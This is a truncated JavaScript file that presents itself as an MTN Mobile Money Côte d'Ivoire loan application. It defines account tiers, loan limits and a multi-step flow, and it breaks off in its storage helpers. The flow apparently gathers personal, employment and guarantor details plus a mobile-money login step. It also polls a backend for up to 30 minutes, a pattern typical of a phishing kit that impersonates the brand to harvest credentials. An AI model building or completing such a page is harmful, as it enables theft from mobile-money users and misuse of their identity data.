// ============================================================
// script.js – MTN Mobile Money Côte d'Ivoire  (v7.7)
// BCEAO-compliant accounts · Skip-linking flow · JSON backend
// ============================================================
'use strict';

var ACCOUNT_TYPES = {
    simplifie: { name: 'Compte Simplifié', icon: '🟢', dailyCash: 200000,  monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000,  requiresId: true },
    standard:  { name: 'Compte Standard',  icon: '🔵', dailyCash: 500000,  monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000,  requiresId: true },
    premium:   { name: 'Compte Premium',   icon: '🟣', dailyCash: 2000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000, requiresId: true }
};

var STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
var POLL_INTERVAL = 2500;
var POLL_MAX_DURATION = 30 * 60 * 1000;
var ANNUAL_RATE = 0.24;
var SERVICE_FEE = 500;

var S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

var KEYS = { APP_ID: 'momo_ci_app_id_v7', APP_DATA: 'momo_ci_data_v7' };

var activePoll = null;
var currentPollStep = null;
var currentPollCallback = null;
var currentPollStarted = 0;
var regPollTimer = null;
var selectedAccountType = null;
var selectedChooseAccountType = null;
var qualificationAnimator = null;
var _termsCache = null;

// ═══════════════════════════════════════════════════════════
// STORAGE HELPERS
// ═══════════════════════════════════════════════════════════
function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return
